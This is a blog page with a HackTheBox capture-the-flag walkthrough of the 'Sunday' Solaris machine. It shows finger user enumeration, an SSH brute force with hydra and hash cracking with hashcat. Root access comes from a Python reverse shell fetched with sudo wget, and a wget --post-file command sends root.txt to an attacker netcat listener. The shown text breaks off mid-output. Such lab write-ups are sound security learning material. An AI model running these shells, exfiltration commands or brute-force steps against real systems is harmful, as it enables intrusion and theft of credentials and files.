@@ -1,0 +1,818 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Marco Meli">
+  <meta name="description" content="Sunday | On this article I am going to demo a machine called Sunday from hackthebox. Initial Nmap As usual we start our enumeration with nmap. I...">
+
+  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">
+
+  
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>
+
+  <link href="https://sittingducks.io/theme/css/colorbox.css" rel="stylesheet">
+
+  <link href="https://fonts.googleapis.com/css?family=Squada+One|Source+Code+Pro|Merriweather:300|Abril+Fatface" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+  <script src="/theme/tipuesearch/tipuesearch_set.js"></script>
+  <script src="/tipuesearch_content.js"></script>
+  <link rel="stylesheet" href="/theme/tipuesearch/tipuesearch.css">
+  <script src="/theme/tipuesearch/tipuesearch.js"></script>
+ 
+
+
+<meta name="keywords" content="HackTheBox">
+
+
+  <title>Sunday</title>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-156989597-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+</head>
+
+<body class="home blog">
+  <div>
+    <header class="site-header">
+      <nav class="navbar navbar-default" role="navigation"> 
+	  
+		<form id="searchform" action="/search" onsubmit="return (this.elements['q'].value.length > 0)">
+		<input id="searchbox" type="text" name="q" size="12" placeholder="Search">
+		</form>
+		
+        <div class="container">
+          <div class="row">
+            <div class="site-navigation-inner col-sm-12">
+              <div class="navbar-header">
+                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                </button>
+              </div>
+              <div class="collapse navbar-collapse navbar-ex1-collapse">
+              <ul id="menu-all-pages" class="nav navbar-nav">
+                <li class="menu-item"><a href="htts://sittingducks.io" >home
+<i class="fa  fa-lg"></i></a></li>
+              </ul>
+              </div>
+              <div class="social">   
+                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
+<i class="fa fa-linkedin fa-lg"></i></a>
+                <a href="https://twitter.com/M4rC0ff" title="Twitter" >
+<i class="fa fa-twitter fa-lg"></i></a>
+                <a href="https://github.com/M4rc0ff" title="github" >
+<i class="fa fa-github fa-lg"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav><!-- .site-navigation -->
+
+      <div class="container">
+      <div id="logo">
+        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="../images/logo.png" class="attachment-full size-full" alt="logo">          </a>
+        </span><!-- end of .site-name -->
+      </div><!-- end of #logo -->
+        <div class="tagline">
+                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
+                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (32)</a> &#124; 
+                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
+                <a href="https://sittingducks.io/archives.html" >Archives (34)</a>
+        </div>
+    </div>
+
+  </header><!-- #masthead -->
+  </div>
+    <div id="content" class="site-content">
+      <div class="container main-content-area">
+        <div class="row">
+          <div class="main-content-inner col-sm-12 col-md-12">
+            <div id="primary" class="content-area">
+              <div id="main" class="site-main" role="main">
+                <div class="article-container">
+<article>
+  <div class="blog-item-wrap">
+    <div class="post-inner-content">
+      <header class="entry-header page-header">
+        <span class="cat-item"><time datetime="2019-12-07 06:11:00+00:00">Sat 07 December 2019</time></span>
+        <h1 class="entry-title"><a href="https://sittingducks.io/Sunday.html">Sunday</a></h1>
+      </header><!-- .entry-header -->
+      <div class="fb-like" data-href="https://sittingducks.io/Sunday.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
+      <div class="entry-content">
+        <p>On this article I am going to demo a machine called Sunday from hackthebox.</p>
+<h1 id="initial-nmap">Initial Nmap</h1>
+<p>As usual we start our enumeration with nmap. I initially ran an nmap on the default ports but since I wasn't going anywhere I decided to run a full scan with the "-p-" parameter and indeed I got two extra non-default ports. After all, in a real engagement we will most probably run a full scan unless there are any specific reasons to do otherwise.</p>
+<div class="highlight"><pre><span></span><span class="gp">user@SittingDucks:~$</span> nmap -p- -oA Documents/htb/boxes/sunday/allPorts_nmap <span class="m">10</span>.10.10.76 --max-retries <span class="m">0</span>
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-07 07:01 GMT</span>
+<span class="go">Warning: 10.10.10.76 giving up on port because retransmission cap hit (0).</span>
+<span class="go">Nmap scan report for 10.10.10.76</span>
+<span class="go">Host is up (0.11s latency).</span>
+<span class="go">Not shown: 62619 filtered ports, 2912 closed ports</span>
+<span class="go">PORT      STATE SERVICE</span>
+<span class="go">79/tcp    open  finger</span>
+<span class="go">111/tcp   open  rpcbind</span>
+<span class="go">22022/tcp open  unknown</span>
+<span class="go">47869/tcp open  unknown</span>
+
+<span class="go">Nmap done: 1 IP address (1 host up) scanned in 110.91 seconds</span>
+</pre></div>
+
+
+<p>Since the non-default ports found have unknown services I run another targeted scan on these ports to see if I can find out more.</p>
+<div class="highlight"><pre><span></span><span class="gp">user@SittingDucks:~$</span> nmap -sV -p <span class="m">22022</span>,47869 <span class="m">10</span>.10.10.76
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-07 07:06 GMT</span>
+<span class="go">Nmap scan report for 10.10.10.76</span>
+<span class="go">Host is up (0.097s latency).</span>
+
+<span class="go">PORT      STATE SERVICE VERSION</span>
+<span class="go">22022/tcp open  ssh     SunSSH 1.3 (protocol 2.0)</span>
+<span class="go">47869/tcp open  rpcbind</span>
+
+<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="go">Nmap done: 1 IP address (1 host up) scanned in 29.28 seconds</span>
+</pre></div>
+
+
+<p>The above scan tells us that an ssh service is running on port 22022 and an rcpbind service on port 47869.</p>
+<h1 id="enumerating-users-with-finger">Enumerating users with <em>finger</em></h1>
+<p>In the first scan we found the <a href="https://en.wikipedia.org/wiki/Finger_protocol#Application_support">finger</a> service running on port 79. Finger is a simple network protocol that allows clients to request users information to a server running the finger service. The program can provide information such as whether a user is currently logged on, the email address, full name, etc. This is an old protocol and although might have been considered useful in the past, today its use is quite questionable in terms of privacy and security.  </p>
+<p>To query the server you can do something similar from a machine where the finger client is installed:</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> finger @10.10.10.76
+<span class="go">No one logged on</span>
+<span class="gp">root@SittingDucks:~#</span> finger test@10.10.10.76
+<span class="go">Login       Name               TTY         Idle    When    Where</span>
+<span class="go">test                  ???</span>
+<span class="gp">root@SittingDucks:~#</span> finger root@10.10.10.76
+<span class="go">Login       Name               TTY         Idle    When    Where</span>
+<span class="go">root     Super-User            pts/3        &lt;Apr 24, 2018&gt; sunday              </span>
+<span class="gp">root@SittingDucks:~#</span> 
+</pre></div>
+
+
+<p>The first command tells us there is no one currently logged on on the box. In the second command I just use test as the user as I don't know any user names. Last I use root and I got some information. Now, since we know ssh is running we could definitely try to brute-force using root but it is highly unlikely we can get in as ssh root login could be disabled. To have more chances of success we should find out other users present in the box and then see if we can get in using one of them.</p>
+<p>While doing some research online I found a tool at <a href="http://pentestmonkey.net/tools/user-enumeration/finger-user-enum">pentestmonkey</a> called finger-user-enum.pl. This simple perl script can help us querying the server to gather information on users. I think there is also a metasploit module that can assist on that but I prefer to use manual scripts as much as I can.</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~$</span> perl finger-user-enum.pl -U /usr/share/SecLists/Usern
+<span class="go">ames/Names/names.txt -t 10.10.10.76| less -S</span>
+
+<span class="go">Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )</span>
+
+<span class="go"> ----------------------------------------------------------</span>
+<span class="go">|                   Scan Information                       |</span>
+<span class="go"> ----------------------------------------------------------</span>
+
+<span class="go">Worker Processes ......... 5</span>
+<span class="go">Usernames file ........... /usr/share/SecLists/Usernames/Names/names.txt</span>
+<span class="go">Target count ............. 1</span>
+<span class="go">Username count ........... 10163</span>
+<span class="go">Target TCP port .......... 79</span>
+<span class="go">Query timeout ............ 5 secs</span>
+<span class="go">Relay Server ............. Not used</span>
+
+<span class="gp">#</span><span class="c1">####### Scan started at Sat Dec  7 07:01:58 2019 #########</span>
+<span class="go">access@10.10.10.76: access No Access User                     &lt; .  .  .  . &gt;..nobody4  SunOS 4.x NFS Anonym               &lt; .  .  .  . &gt;..</span>
+<span class="go">admin@10.10.10.76: Login       Name               TTY         Idle    When    Where..adm      Admin                              &lt; .  .  .  . &gt;..lp       Line Printer Admin                 &gt;</span>
+<span class="go">anne marie@10.10.10.76: Login       Name               TTY         Idle    When    Where..anne                  ???..marie                 ???..</span>
+<span class="go">bin@10.10.10.76: bin             ???                         &lt; .  .  .  . &gt;..</span>
+<span class="go">dee dee@10.10.10.76: Login       Name               TTY         Idle    When    Where..dee                   ???..dee                   ???..</span>
+<span class="go">la verne@10.10.10.76: Login       Name               TTY         Idle    When    Where..la                    ???..verne                 ???..</span>
+<span class="go">message@10.10.10.76: Login       Name               TTY         Idle    When    Where..smmsp    SendMail Message Sub               &lt; .  .  .  . &gt;..</span>
+<span class="go">miof mela@10.10.10.76: Login       Name               TTY         Idle    When    Where..miof                  ???..mela                  ???..</span>
+<span class="go">sammy@10.10.10.76: sammy                 pts/2        &lt;Apr 24, 2018&gt; 10.10.14.4          ..</span>
+<span class="go">sunny@10.10.10.76: sunny                 pts/3        &lt;Apr 24, 2018&gt; 10.10.14.4          ..</span>
+<span class="go">sys@10.10.10.76: sys             ???                         &lt; .  .  .  . &gt;..</span>
+<span class="gp">#</span><span class="c1">####### Scan completed at Sat Dec  7 07:39:50 2019 #########</span>
+<span class="go">11 results.</span>
+
+<span class="go">10163 queries in 2272 seconds (4.5 queries / sec)</span>
+</pre></div>
+
+
+<p>The above output contains interesting results. Particularly we can see the users <code>sammy</code> and <code>sunny</code> use a pts terminal instead of a tty like the rest of users. Furthermore, the <code>root</code> user is missing from the list and probably because it is not included in the names.txt file. We know, however, from the test we did before that the <code>root</code> user uses the same terminal as the users <code>sammy</code> and <code>sunny</code> so these are probably the users we are looking for.</p>
+<h1 id="ssh-brute-force">SSH brute force</h1>
+<p>So now I start an ssh brute-force attack using hydra against the user sunny. To do that I used a standard passwords list, called rockyou, you can find in kali:</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> hydra -s <span class="m">22022</span> -l sunny -P /usr/share/wordlists/rockyou.txt -t <span class="m">50</span> <span class="m">1</span>
+<span class="go">0.10.10.76 ssh                                                                  </span>
+<span class="go">Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span>
+
+<span class="go">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-12-12 10:34:10</span>
+<span class="go">[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span>
+<span class="go">[DATA] max 50 tasks per 1 server, overall 50 tasks, 14344399 login tries (l:1/p:14344399), ~286888 tries per task</span>
+<span class="go">[DATA] attacking ssh://10.10.10.76:22022/</span>
+<span class="go">[STATUS] 891.00 tries/min, 891 tries in 00:01h, 14343609 to do in 268:19h, 50 active</span>
+<span class="go">[STATUS] 587.67 tries/min, 1763 tries in 00:03h, 14342737 to do in 406:47h, 50 active</span>
+<span class="go">[ERROR] ssh target does not support password auth</span>
+<span class="go">[22022][ssh] host: 10.10.10.76   login: sunny   password: sunday</span>
+<span class="go">1 of 1 target successfully completed, 1 valid password found</span>
+<span class="go">[WARNING] Writing restore file because 45 final worker threads did not complete until end.</span>
+<span class="go">[ERROR] 45 targets did not resolve or could not be connected</span>
+<span class="go">[ERROR] 0 targets did not complete</span>
+<span class="go">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-12-12 10:38:50</span>
+</pre></div>
+
+
+<p>Although hydra threw an error and I was about to stop the scan, I still got a result straight after! So the password for the user sunny is <strong>sunday</strong>. To be fair, the first thing one has to do is trying few basic passwords and combinations of it. With that in mind we could have easily guessed it but the whole point here was to demonstrate a simple ssh brute-force attack.</p>
+<p>Now, I run the same brute force attack for the user sammy in the background and at the same time I try to ssh with sunny.</p>
+<div class="highlight"><pre><span></span><span class="gp">user@SittingDucks:~$</span> ssh -p <span class="m">22022</span> sunny@10.10.10.76
+<span class="go">Unable to negotiate with 10.10.10.76 port 22022: no matching key exchange method found. Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1</span>
+</pre></div>
+
+
+<p>I googled this up and I found out at <a href="http://www.openssh.com/legacy.html">openssh.com</a> that this is a legacy issue and can be circumvented by using this command:</p>
+<div class="highlight"><pre><span></span><span class="gp">user@SittingDucks:~$</span> ssh -p <span class="m">22022</span> -oKexAlgorithms<span class="o">=</span>+diffie-hellman-group1-sha1 sunny@10.10.10.76
+<span class="go">Password: </span>
+<span class="go">Last login: Thu Dec 12 10:39:10 2019 from 10.10.14.46</span>
+<span class="go">Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008</span>
+<span class="gp">sunny@sunday:~$</span>
+</pre></div>
+
+
+<p>I can see I am dealing with an old Solaris box. We could probably leverage some vulnerabilities later on given its age.</p>
+<p>For those unfamiliar with hackthebox, the objectives are mainly two. The first is to find a user.txt file (usually found in the user home) and the other is to find a root.txt file (usually found in /root) . Both files contain a hash that you can then submit to hackthebox to prove that you gained user access and then you were able to successfully escalate privileges to root. </p>
+<p>With that in mind I look for the user.txt file:</p>
+<div class="highlight"><pre><span></span><span class="gp">sunny@sunday:~$</span> find / -name user.txt                                                                                                                       find: /export/home/sammy/.gnome2: Permission denied                                                                                                          find: /export/home/sammy/.gconf: Permission denied                                                                                                            /export/home/sammy/Desktop/user.txt     
+
+<span class="gp">sunny@sunday:~$</span> cat /export/home/sammy/Desktop/user.txt                                       
+<span class="go">cat: /export/home/sammy/Desktop/user.txt: Permission denied</span>
+</pre></div>
+
+
+<p>looks like the file is located under the user sammy home directory and sunny does not have permission to access it.</p>
+<p>Probably the most immediate thing one should do is to check what the user sunny is allowed to do as root. The "sudo -l" command can help with that:</p>
+<div class="highlight"><pre><span></span><span class="gp">sunny@sunday:~$</span> sudo -l
+<span class="go">User sunny may run the following commands on this host:</span>
+<span class="go">    (root) NOPASSWD: /root/troll</span>
+</pre></div>
+
+
+<p>I can see sunny is allowed to execute troll without the need of the password. When executing troll we just see</p>
+<div class="highlight"><pre><span></span><span class="gp">sunny@sunday:~$</span> sudo /root/troll
+<span class="go">testing</span>
+<span class="go">uid=0(root) gid=0(root)</span>
+</pre></div>
+
+
+<p>which is not very useful.</p>
+<p>From Sunny to Sammy (hash brute force)</p>
+<p>Before doing some enumeration with aid of scripts I check the folder structure to see if we have something useful. </p>
+<div class="highlight"><pre><span></span><span class="gp">sunny@sunday:~$</span> <span class="nb">cd</span> /                                                                         
+<span class="gp">sunny@sunday:/$</span> ls -l
+<span class="go">total 524</span>
+<span class="go">drwxr-xr-x   2 root root      4 2018-04-15 20:44 backup</span>
+<span class="go">lrwxrwxrwx   1 root root      9 2018-04-15 19:52 bin -&gt; ./usr/bin</span>
+<span class="go">drwxr-xr-x   6 root sys       7 2018-04-15 19:52 boot</span>
+<span class="go">drwxr-xr-x   2 root root      2 2018-04-16 15:33 cdrom</span>
+<span class="go">drwxr-xr-x 265 root sys     265 2019-12-12 09:30 dev</span>
+<span class="go">drwxr-xr-x  10 root sys      10 2019-12-12 09:30 devices</span>
+<span class="go">drwxr-xr-x  77 root sys     224 2019-12-12 11:34 etc</span>
+<span class="go">drwxr-xr-x   3 root root      3 2018-04-15 19:44 export</span>
+<span class="go">dr-xr-xr-x   1 root root      1 2019-12-12 09:31 home</span>
+<span class="go">drwxr-xr-x  19 root sys      20 2018-04-15 19:45 kernel</span>
+<span class="go">drwxr-xr-x  10 root bin     180 2018-04-15 19:45 lib</span>
+<span class="go">drwx------   2 root root      2 2009-05-14 21:27 lost+found</span>
+<span class="go">drwxr-xr-x   2 root root      4 2019-12-12 09:31 media</span>
+<span class="go">drwxr-xr-x   2 root sys       2 2018-04-15 19:52 mnt</span>
+<span class="go">dr-xr-xr-x   1 root root      1 2019-12-12 09:31 net</span>
+<span class="go">drwxr-xr-x   4 root sys       4 2018-04-15 19:52 opt</span>
+<span class="go">drwxr-xr-x   5 root sys       5 2009-05-14 21:21 platform</span>
+<span class="go">dr-xr-xr-x  56 root root 480032 2019-12-12 12:06 proc</span>
+<span class="go">drwx------   6 root root     13 2018-04-24 10:31 root</span>
+<span class="go">drwxr-xr-x   4 root root      4 2018-04-15 19:52 rpool</span>
+<span class="go">drwxr-xr-x   2 root sys      58 2018-04-15 19:53 sbin</span>
+<span class="go">drwxr-xr-x   4 root root      4 2009-05-14 21:18 system</span>
+<span class="go">drwxrwxrwt   4 root sys     384 2019-12-12 09:31 tmp</span>
+<span class="go">drwxr-xr-x  30 root sys      44 2018-04-15 19:46 usr</span>
+<span class="go">drwxr-xr-x  35 root sys      35 2018-04-15 20:26 var</span>
+</pre></div>
+
+
+<p>The / directory shows a backup folder which I don't think is a system default folder. </p>
+<div class="highlight"><pre><span></span><span class="gp">sunny@sunday:/backup$</span> ls -l
+<span class="go">total 2</span>
+<span class="go">-r-x--x--x 1 root root  53 2018-04-24 10:35 agent22.backup</span>
+<span class="go">-rw-r--r-- 1 root root 319 2018-04-15 20:44 shadow.backup</span>
+<span class="gp">sunny@sunday:/backup$</span> cat agent22.backup 
+<span class="go">cat: agent22.backup: Permission denied</span>
+<span class="gp">sunny@sunday:/backup$</span> cat shadow.backup 
+<span class="go">mysql:NP:::::::</span>
+<span class="go">openldap:*LK*:::::::</span>
+<span class="go">webservd:*LK*:::::::</span>
+<span class="go">postgres:NP:::::::</span>
+<span class="go">svctag:*LK*:6445::::::</span>
+<span class="go">nobody:*LK*:6445::::::</span>
+<span class="go">noaccess:*LK*:6445::::::</span>
+<span class="go">nobody4:*LK*:6445::::::</span>
+<span class="gp">sammy:$5$Ebkn8jlK$</span>i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
+<span class="gp">sunny:$5$iRMbpnBv$</span>Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
+</pre></div>
+
+
+<p>As shown above we have the hash of the user sammy and so we can try to crack it. First I checked online into one of the numerous websites to understand what kind of hash is this and the result is:</p>
+<blockquote>
+<p>sha256crypt, SHA256(Unix) </p>
+</blockquote>
+<p>then from the <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">hashcat official website hashes example</a> I found out that the corresponding hash-mode is 7400. With this knowledge we can shorten the time hashcat would take to crack the password since it will try less combinations. </p>
+<p>I run hashcat and after some time I got this result:</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> hashcat -m <span class="m">7400</span> /home/user/Documents/htb/boxes/sunday/sammy_hash /usr/share/wordlists/rockyou.txt --force                                                                        
+<span class="go">hashcat (v5.1.0) starting...                                                                                                                                                                  </span>
+
+<span class="go">OpenCL Platform #1: The pocl project                                                                                                                                                          </span>
+<span class="go">====================================                                                                                                                                                          </span>
+<span class="go">* Device #1: pthread-Intel(R) Core(TM) i7-6820HQ CPU @ 2.70GHz, 1024/2647 MB allocatable, 2MCU                                                                                                </span>
+
+<span class="go">Hashes: 1 digests; 1 unique digests, 1 unique salts                                                                                                                                           </span>
+<span class="go">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates                                                                                                                  </span>
+<span class="go">Rules: 1                                                                                                                                                                                      </span>
+
+<span class="go">Applicable optimizers:                                                                                                                                                                        </span>
+<span class="go">* Zero-Byte                                                                                                                                                                                   </span>
+<span class="go">* Single-Hash                                                                                                                                                                                 </span>
+<span class="go">* Single-Salt                                                                                                                                                                                 </span>
+
+<span class="go">Minimum password length supported by kernel: 0                                                                                                                                                </span>
+<span class="go">Maximum password length supported by kernel: 256 </span>
+
+<span class="go">Dictionary cache built:                                                                                                                                                                       </span>
+<span class="go">* Filename..: /usr/share/wordlists/rockyou.txt                                                                                                                                                </span>
+<span class="go">* Passwords.: 14344392                                                                                                                                                                        </span>
+<span class="go">* Bytes.....: 139921507                                                                                                                                                                       </span>
+<span class="go">* Keyspace..: 14344385                                                                                                                                                                        </span>
+<span class="go">* Runtime...: 2 secs                                                                                                                                                                          </span>
+
+<span class="go">[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =&gt; s</span>
+
+<span class="gp">$</span><span class="m">5</span><span class="nv">$Ebkn8jlK$i6SSPa0</span>.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:cooldude!
+
+<span class="go">Session..........: hashcat</span>
+<span class="go">Status...........: Cracked</span>
+<span class="go">Hash.Type........: sha256crypt $5$, SHA256 (Unix)</span>
+<span class="go">Hash.Target......: $5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB</span>
+<span class="go">Time.Started.....: Thu Dec 12 14:22:11 2019 (13 mins, 5 secs)</span>
+<span class="go">Time.Estimated...: Thu Dec 12 14:35:16 2019 (0 secs)</span>
+<span class="go">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)</span>
+<span class="go">Guess.Queue......: 1/1 (100.00%)</span>
+<span class="go">Speed.#1.........:      260 H/s (12.51ms) @ Accel:128 Loops:64 Thr:1 Vec:8</span>
+<span class="go">Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts</span>
+<span class="go">Progress.........: 203776/14344385 (1.42%)</span>
+<span class="go">Rejected.........: 0/203776 (0.00%)</span>
+<span class="go">Restore.Point....: 203520/14344385 (1.42%)</span>
+<span class="go">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000</span>
+<span class="go">Candidates.#1....: coolster -&gt; chs2009</span>
+</pre></div>
+
+
+<p>so sammy's password is "cooldude!". </p>
+<div class="highlight"><pre><span></span><span class="gp">sunny@sunday:~$</span> su - sammy
+<span class="go">Password: </span>
+<span class="go">Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008</span>
+<span class="gp">sammy@sunday:~$</span> id
+<span class="go">uid=101(sammy) gid=10(staff) groups=10(staff)</span>
+</pre></div>
+
+
+<p>At this stage I was able to move to sammy's Desktop and read the user.txt file. Now let's see what we can do to root this box.</p>
+<div class="highlight"><pre><span></span><span class="gp">sammy@sunday:~$</span> sudo -l
+<span class="go">User sammy may run the following commands on this host:</span>
+<span class="go">    (root) NOPASSWD: /usr/bin/wget</span>
+</pre></div>
+
+
+<p>From the above extract we can see that sammy can run wget so we can use it to potentially download something to the victim box? During my research I found several methods for rooting this box. So I decided to try them all for learning purposes:</p>
+<h1 id="root-privesc">ROOT privesc</h1>
+<p>I found several ways to root this box and I will list them all here.</p>
+<h3 id="1-overwriting-troll">1. Overwriting troll</h3>
+<div class="highlight"><pre><span></span><span class="gp">sunny@sunday:~$</span> sudo /root/troll
+<span class="go">testing</span>
+<span class="go">uid=0(root) gid=0(root)</span>
+</pre></div>
+
+
+<p>Just to recap the above output shows what troll contains. </p>
+<p>I dowload a simple python shell in my kali box from the Internet and save the content in a file (shell.py)</p>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/python</span>
+
+<span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">import</span> <span class="nn">os</span>
+
+<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s2">&quot;10.10.14.46&quot;</span><span class="p">,</span><span class="mi">9999</span><span class="p">))</span>
+<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">p</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">([</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="s2">&quot;-i&quot;</span><span class="p">]);</span>
+</pre></div>
+
+
+<p>Then I create a simple python http server in the directory where the shell.py is located and I overwrite troll with shell.py:</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:/home/user/Documents/htb/boxes/sunday#</span> python -m SimpleHTTPServer 
+<span class="go">Serving HTTP on 0.0.0.0 port 8000 ...</span>
+</pre></div>
+
+
+<p>and from sunday:</p>
+<div class="highlight"><pre><span></span><span class="gp">sammy@sunday:~$</span> sudo wget http://10.10.14.46:8000/shell.py -O /root/troll
+<span class="go">--21:01:45--  http://10.10.14.46:8000/shell.py</span>
+<span class="go">           =&gt; `/root/troll&#39;</span>
+<span class="go">Connecting to 10.10.14.46:8000... connected.</span>
+<span class="go">HTTP request sent, awaiting response... 200 OK</span>
+<span class="go">Length: 246 [text/plain]</span>
+
+<span class="go">100%[==================================================================================================================&gt;] 246           --.--K/s             </span>
+
+<span class="go">21:01:45 (68.40 MB/s) - `/root/troll&#39; saved [246/246]</span>
+</pre></div>
+
+
+<p>now before running troll I open a netcat listener in my kali box:</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> nc -lvnp <span class="m">9999</span>
+<span class="go">listening on [any] 9999 ...</span>
+<span class="go">connect to [10.10.14.46] from (UNKNOWN) [10.10.10.76] 56164</span>
+<span class="gp">root@sunday:~#</span> id
+<span class="go">uid=0(root) gid=0(root) groups=0(root),1(other),2(bin),3(sys),4(adm),5(uucp),6(mail),7(tty),8(lp),9(nuucp),12(daemon)</span>
+</pre></div>
+
+
+<p>Achieving the above was not very easy. It turns out there is a script resetting troll back again to its original state every 5 seconds. I only managed that as I was fast and I got the tip from IPPSEC.</p>
+<h3 id="2-read-the-roottxt-with-wget-options">2. Read the root.txt with wget options</h3>
+<p>I admit at this stage I was stuck for more than I expected. I am quite sure being a an old Solaris box there will be vulnerabilities to exploit althouth I did not manage to do it and wasted quite some time. However, researching online I found out that we could use the wget command to simply read file by using the <strong><em>--input-file</em></strong> (<strong><em>-i</em></strong>) option. So since sammy can run wget as root we can use it to read any file we want. Let's try to read root.txt</p>
+<div class="highlight"><pre><span></span><span class="gp">sammy@sunday:~$</span> sudo wget -i /root/root.txt
+<span class="go">/root/root.txt: Invalid URL fb????????????????????????????b8: Unsupported scheme</span>
+<span class="go">No URLs found in /root/root.txt.</span>
+</pre></div>
+
+
+<p>Although I get an error because there were no URL found, I am still able to see the content of root.txt. Very simple and effective!</p>
+<p>Another way to read the root.txt file is by using the <strong><em>--post-file</em></strong> option:</p>
+<div class="highlight"><pre><span></span><span class="gp">sammy@sunday:~$</span> sudo wget --post-file<span class="o">=</span>/root/root.txt <span class="m">10</span>.10.14.46:1234
+<span class="go">--10:20:52--  http://10.10.14.46:1234/</span>
+<span class="go">           =&gt; `index.html&#39;</span>
+<span class="go">Connecting to 10.10.14.46:1234... connected.</span>
+<span class="go">HTTP request sent, awaiting response...</span>
+</pre></div>
+
+
+<p>and on my kali box, where I had opened a netcan session started we can see the hash:</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> nc -lvnp <span class="m">1234</span>
+<span class="go">listening on [any] 1234 ...</span>
+<span class="go">connect to [10.10.14.46] from (UNKNOWN) [10.10.10.76] 44131</span>
+<span class="go">POST / HTTP/1.0</span>
+<span class="go">User-Agent: Wget/1.10.2</span>
+<span class="go">Accept: */*</span>
